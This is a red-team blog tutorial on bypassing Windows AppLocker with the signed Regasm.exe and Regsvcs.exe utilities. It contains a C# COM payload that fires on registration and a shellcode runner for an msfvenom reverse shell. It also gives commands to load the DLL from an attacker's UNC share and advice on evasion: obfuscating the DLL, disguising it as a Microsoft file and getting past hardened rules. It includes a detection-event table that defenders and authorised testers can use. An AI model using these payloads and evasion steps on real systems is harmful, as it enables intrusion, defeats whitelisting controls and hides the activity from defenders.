---
title: "AppLocker Bypass: Regasm and Regsvcs"
date: 2026-03-06
description: "A practical red team guide to bypassing AppLocker using Regasm.exe and Regsvcs.exe through COM object abuse, covering payload development, default and configured rule bypasses, and OPSEC considerations."
tags: ["redteam", "applocker", "bypass", "regasm", "regsvcs", "lolbins", "windows", "evasion"]
---

## Introduction

AppLocker is one of the most common application whitelisting solutions encountered on Windows engagements. When configured correctly it can be a significant obstacle: it blocks execution of arbitrary binaries, scripts, and DLLs from untrusted paths. When configured poorly, or when relying entirely on default rules, it can be bypassed trivially using trusted Microsoft-signed binaries that live inside whitelisted directories.

Two of the most reliable AppLocker bypasses available to red teamers are **Regasm.exe** and **Regsvcs.exe** — both legitimate .NET COM registration utilities that can execute arbitrary managed code as a side effect of their normal operation, entirely within AppLocker's trusted paths.

This post covers:

- How AppLocker works and why default rules are insufficient
- Building a COM object payload in C#
- Abusing Regasm.exe and Regsvcs.exe to execute it
- Bypassing both default and configured AppLocker rules
- OPSEC considerations for real engagements

{{< callout type="warning" >}}
This post is intended for **authorized red team engagements and lab environments only**. Do not use these techniques against systems you do not own or have explicit written permission to test.
{{< /callout >}}

---

## How AppLocker Works

AppLocker enforces execution policies through rules defined across four categories:

| Rule Collection | Controls |
|---|---|
| Executable Rules | .exe and .com files |
| Windows Installer Rules | .msi, .msp, .mst files |
| Script Rules | .ps1, .bat, .cmd, .vbs, .js files |
| DLL Rules | .dll and .ocx files (disabled by default) |
| Packaged App Rules | Modern UWP apps |

Rules can be defined by **path**, **publisher** (digital signature), or **file hash**. The critical weakness in most AppLocker deployments is the reliance on **default rules**, which whitelist entire directories:

```
%WINDIR%\*          → Everything in C:\Windows\ is allowed
%PROGRAMFILES%\*    → Everything in C:\Program Files\ is allowed
%PROGRAMFILES(X86)%\* → Everything in C:\Program Files (x86)\ is allowed
```

This is where Regasm and Regsvcs come in. Both binaries live inside `%WINDIR%\Microsoft.NET\Framework\`, a path covered by the default `%WINDIR%\*` rule, meaning they are **always trusted by default AppLocker policies**.

> 📸 **Figure 1** — Screenshot: AppLocker policy in gpedit.msc showing default executable rules with %WINDIR% and %PROGRAMFILES% path rules
> `static/images/applocker-bypass/figure-01-applocker-default-rules.png`

### Verifying AppLocker is Enforced

Before attempting a bypass, confirm AppLocker is active and in enforcing mode:

```powershell
# Check AppLocker policy
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Check enforcement mode
Get-AppLockerPolicy -Effective -Xml | Select-String "EnforcementMode"

# Test if a specific file would be blocked
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path "C:\Users\Public\test.exe" -User Everyone
```

> 📸 **Figure 2** — Screenshot: PowerShell output showing AppLocker in Enforce mode and a test binary being blocked
> `static/images/applocker-bypass/figure-02-applocker-enforced.png`

---

## Understanding Regasm and Regsvcs

### Regasm.exe

`Regasm.exe` (Assembly Registration Utility) is a legitimate .NET tool used to register managed assemblies as COM components so they can be accessed by unmanaged code. It lives at:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
```

The key abuse primitive is the `[ComRegisterFunction]` and `[ComUnregisterFunction]` attributes. When Regasm processes an assembly, it calls any method decorated with these attributes, and it does so **regardless of whether the assembly is actually being registered as a COM object**. This means you can put arbitrary code inside these methods and have it execute simply by pointing Regasm at your DLL.

### Regsvcs.exe

`Regsvcs.exe` (.NET Component Services Registrar) is used to register .NET assemblies into COM+ applications. It lives at:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe
```

It abuses the same `[ComRegisterFunction]` and `[ComUnregisterFunction]` attributes as Regasm, with one additional feature: it also calls `[ApplicationActivator]` methods during registration. For our purposes the exploitation path is essentially identical.

{{< callout type="info" >}}
Both binaries are signed by Microsoft, live in `%WINDIR%`, and are trusted by AppLocker default rules. Neither requires administrator privileges to run in certain configurations, making them ideal for low-privilege bypasses.
{{< /callout >}}

---

## Building the COM Object Payload

The payload is a C# class library (DLL) that implements the minimum required COM attributes. The malicious code lives inside the `[ComRegisterFunction]` method, which Regasm and Regsvcs call automatically during registration.

### Payload Source Code

Create a new file called `Bypass.cs`:

```csharp {linenos=inline}
using System;
using System.Runtime.InteropServices;
using System.EnterpriseServices;

namespace Bypass
{
    [ComVisible(true)]
    [Guid("XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX")]
    public class Bypass : ServicedComponent
    {
        public Bypass() { }

        [ComRegisterFunction]
        public static void RegisterClass(string key)
        {
            Execute();
        }

        [ComUnregisterFunction]
        public static void UnRegisterClass(string key)
        {
            Execute();
        }

        public static void Execute()
        {
            // Replace this with your payload
            // Example: reverse shell, shellcode runner, download cradle
            System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\Users\\Public\\pwned.txt");
            
            // For a real engagement replace the above with shellcode execution:
            // ShellcodeRunner();
        }
    }
}
```

{{< callout type="info" >}}
Both `[ComRegisterFunction]` and `[ComUnregisterFunction]` are implemented and both call `Execute()`. This means the payload fires on both `/regfile` (register) and `/u` (unregister) operations, giving you two execution triggers from a single binary.
{{< /callout >}}

### Compiling the Payload

Compile using the .NET Framework compiler (no Visual Studio required):

```cmd
:: 32-bit
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:Bypass.dll Bypass.cs /unsafe

:: 64-bit
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:Bypass.dll Bypass.cs /unsafe
```

The output is `Bypass.dll`, a managed .NET assembly ready to be consumed by Regasm or Regsvcs.

> 📸 **Figure 3** — Screenshot: csc.exe successfully compiling Bypass.cs into Bypass.dll with no errors
> `static/images/applocker-bypass/figure-03-compile-payload.png`

### Adding a Shellcode Runner

For a real engagement, replace the `Process.Start` call with a shellcode runner. Here is a minimal in-memory shellcode execution example:

```csharp {linenos=inline}
public static void Execute()
{
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f csharp
    byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... }; // Your shellcode here

    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 
        0x3000, 0x40);
    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
    
    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
        IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(hThread, 0xFFFFFFFF);
}

[DllImport("kernel32")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
    uint flAllocationType, uint flProtect);

[DllImport("kernel32")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

> 📸 **Figure 4** — Screenshot: Full payload source code in a text editor showing the ComRegisterFunction attribute and shellcode runner
> `static/images/applocker-bypass/figure-04-payload-source.png`

---

## Executing via Regasm.exe

With `Bypass.dll` compiled and staged, execute it via Regasm:

### Register (triggers ComRegisterFunction)

```cmd
:: Standard registration — triggers [ComRegisterFunction]
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe Bypass.dll

:: With /regfile flag — same trigger, writes a .reg file as side effect
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /regfile:test.reg Bypass.dll
```

### Unregister (triggers ComUnregisterFunction)

```cmd
:: Unregister — triggers [ComUnregisterFunction]
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u Bypass.dll
```

Both operations trigger the payload. The unregister path (`/u`) is particularly useful because it works even if the assembly was never actually registered. Regasm will still call `[ComUnregisterFunction]` and execute your code.

### Running from a UNC Path

A powerful variant: run directly from a network share without touching disk at all:

```cmd
:: Execute payload directly from a UNC path
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe \\attacker-ip\share\Bypass.dll /u
```

This loads and executes the DLL entirely from a network path, with no file written to the target disk at all.

> 📸 **Figure 5** — Screenshot: Regasm.exe executing Bypass.dll — showing the command, Regasm output, and proof of execution (whoami output or reverse shell callback)
> `static/images/applocker-bypass/figure-05-regasm-execution.png`

---

## Executing via Regsvcs.exe

Regsvcs requires the assembly to have a strong name signature. Generate one and sign the DLL:

### Generate a Strong Name Key

```cmd
:: Generate a strong name key pair
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\sn.exe -k key.snk
```

### Update Payload for Strong Name

Add the `AssemblyKeyFile` attribute to your source:

```csharp
using System.Reflection;

[assembly: AssemblyKeyFile("key.snk")]
[assembly: AssemblyVersion("1.0.0.0")]
```

### Recompile with Strong Name

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:Bypass.dll Bypass.cs /keyfile:key.snk /unsafe
```

### Execute via Regsvcs

```cmd
:: Register — triggers [ComRegisterFunction]
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe Bypass.dll

:: Unregister — triggers [ComUnregisterFunction]  
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /u Bypass.dll
```

> 📸 **Figure 6** — Screenshot: Regsvcs.exe executing the signed Bypass.dll with a reverse shell callback in a Netcat listener
> `static/images/applocker-bypass/figure-06-regsvcs-execution.png`

---

## Bypassing Default vs Configured AppLocker Rules

### Default Rules — Easiest Bypass

Default AppLocker rules whitelist `%WINDIR%\*` entirely. Since both Regasm and Regsvcs live inside `%WINDIR%\Microsoft.NET\`, they are always trusted. The bypass works out of the box with no additional considerations.

Stage your DLL anywhere writable:

```
C:\Users\Public\Bypass.dll         ← writable by all users
C:\Windows\Temp\Bypass.dll         ← writable, inside %WINDIR% but DLL rules off by default
\\attacker-ip\share\Bypass.dll     ← no disk touch at all
```

Then call Regasm or Regsvcs from their trusted path pointing at your DLL.

### Configured Rules — Hardened Environments

In hardened environments an administrator may have created explicit **deny rules** or **publisher rules** that restrict what Regasm and Regsvcs can load. Here are the common hardening approaches and how to work around them:

**Hardening: Deny rule on Regasm.exe / Regsvcs.exe by path**

Work around by using the alternate framework path:

```cmd
:: If 64-bit is blocked, try 32-bit
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Bypass.dll

:: Try older framework versions
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe Bypass.dll
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe Bypass.dll
```

**Hardening: DLL rules enabled and blocking untrusted DLLs**

When AppLocker DLL rules are enabled, your compiled `Bypass.dll` may be blocked from loading. Work around by:

```cmd
:: Load from a path explicitly whitelisted in DLL rules
:: Common whitelisted paths even in hardened configs:
C:\Windows\Temp\Bypass.dll
C:\Windows\Tasks\Bypass.dll

:: Or load from a UNC path — DLL rules often do not cover network paths
\\attacker-ip\share\Bypass.dll
```

**Hardening: Script rules blocking csc.exe compilation**

If you cannot compile on the target, compile on your attack machine and transfer the DLL:

```bash
# On Kali — compile using Mono
mcs -target:library -out:Bypass.dll Bypass.cs

# Or use Wine with the .NET Framework compiler
```

> 📸 **Figure 7** — Screenshot: AppLocker event log showing a blocked execution attempt, then successful bypass using alternate framework path
> `static/images/applocker-bypass/figure-07-configured-bypass.png`

### Checking Which Framework Versions Are Available

```powershell
# List all installed .NET framework versions
Get-ChildItem "C:\Windows\Microsoft.NET\Framework\" | Select-Object Name
Get-ChildItem "C:\Windows\Microsoft.NET\Framework64\" | Select-Object Name

# Confirm regasm exists in each version
Get-ChildItem "C:\Windows\Microsoft.NET\Framework*" -Recurse -Filter "regasm.exe" | 
    Select-Object FullName
Get-ChildItem "C:\Windows\Microsoft.NET\Framework*" -Recurse -Filter "regsvcs.exe" | 
    Select-Object FullName
```

---

## OPSEC Considerations

### What Gets Logged

Understanding what telemetry this technique generates is critical for real engagements:

| Event Source | Event ID | What is Logged |
|---|---|---|
| Security Log | 4688 | Regasm.exe / Regsvcs.exe process creation with command line |
| AppLocker Log | 8002 | Allowed execution of Regasm/Regsvcs (yes — allowed events log too) |
| Sysmon | 1 | Full process creation with parent, hash, command line |
| Sysmon | 7 | DLL loaded by Regasm/Regsvcs including your Bypass.dll |
| Sysmon | 3 | Network connection if payload makes outbound connection |

### Reducing Your Footprint

**Use UNC paths where possible:**

```cmd
:: No DLL written to disk — loaded directly from attacker SMB share
regasm.exe \\10.10.10.10\share\Bypass.dll /u
```

**Use the unregister flag:**

The `/u` flag works even if the assembly was never registered and leaves fewer artifacts in the COM registry compared to a full registration.

**Rename your DLL:**

A DLL named `Bypass.dll` or `payload.dll` is an obvious indicator. Name it something that blends in:

```
MicrosoftUpdate.dll
WindowsDefenderHelper.dll
NetFrameworkModule.dll
```

**Choose the right architecture:**

Match the bitness of Regasm/Regsvcs to your shellcode:

```cmd
:: 32-bit shellcode — use 32-bit Regasm
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Bypass.dll /u

:: 64-bit shellcode — use 64-bit Regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe Bypass.dll /u
```

**Obfuscate the DLL:**

Run your compiled DLL through [ConfuserEx](https://github.com/mkaring/ConfuserEx) or similar .NET obfuscators before staging. This breaks static signatures while preserving the COM registration attributes that Regasm needs.

**Avoid writing to high-visibility paths:**

```
❌ C:\Users\Public\payload.dll       ← high visibility, commonly monitored
❌ C:\Windows\Temp\payload.dll       ← logged heavily
✅ C:\Users\username\AppData\Local\  ← lower visibility
✅ \\attacker-ip\share\payload.dll   ← no disk write at all
```

> 📸 **Figure 8** — Screenshot: Sysmon Event ID 1 showing Regasm process creation and Event ID 7 showing Bypass.dll being loaded — demonstrating what a defender would see
> `static/images/applocker-bypass/figure-08-sysmon-telemetry.png`

---

## Full Attack Workflow

``` {linenos=inline}
1. Confirm AppLocker is enforced
   └── Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path "C:\test.exe"

2. Confirm Regasm/Regsvcs are available and trusted
   └── Get-ChildItem "C:\Windows\Microsoft.NET\Framework*" -Recurse -Filter "regasm.exe"

3. Build payload on attack machine
   └── csc.exe /target:library /out:Bypass.dll Bypass.cs /unsafe
   └── Obfuscate with ConfuserEx (optional but recommended)

4. Stage payload
   └── Option A: Copy to writable path on target
   └── Option B: Host on SMB share (impacket-smbserver on Kali)
       impacket-smbserver share /path/to/payload -smb2support

5. Execute via Regasm (no strong name needed)
   └── regasm.exe \\attacker-ip\share\Bypass.dll /u

6. Execute via Regsvcs (strong name required)
   └── sn.exe -k key.snk
   └── Recompile with /keyfile:key.snk
   └── regsvcs.exe \\attacker-ip\share\Bypass.dll /u

7. Catch callback
   └── nc -lvnp 4444
```

---

## Key Takeaways

- AppLocker default rules are fundamentally broken for environments that need real security: `%WINDIR%\*` is far too broad
- Regasm and Regsvcs are reliable bypasses precisely because they are trusted, signed, and expected to appear in normal .NET environments
- The `[ComRegisterFunction]` attribute is the abuse primitive: it executes your code as a side effect of COM registration, not as a standalone execution
- The `/u` unregister flag is the cleanest execution path: it triggers `[ComUnregisterFunction]`, works even without prior registration, and leaves fewer COM registry artifacts
- UNC path loading eliminates disk writes entirely, strongly preferred for OPSEC-sensitive engagements
- DLL rules in AppLocker are disabled by default. Most environments do not have them enabled, making DLL-based bypasses broadly applicable

---

## References

- [LOLBAS — Regasm.exe](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)
- [LOLBAS — Regsvcs.exe](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)
- [MITRE ATT&CK T1218.009 — Regsvcs/Regasm](https://attack.mitre.org/techniques/T1218/009/)
- [AppLocker Documentation — Microsoft](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)
- [ConfuserEx — .NET Obfuscator](https://github.com/mkaring/ConfuserEx)
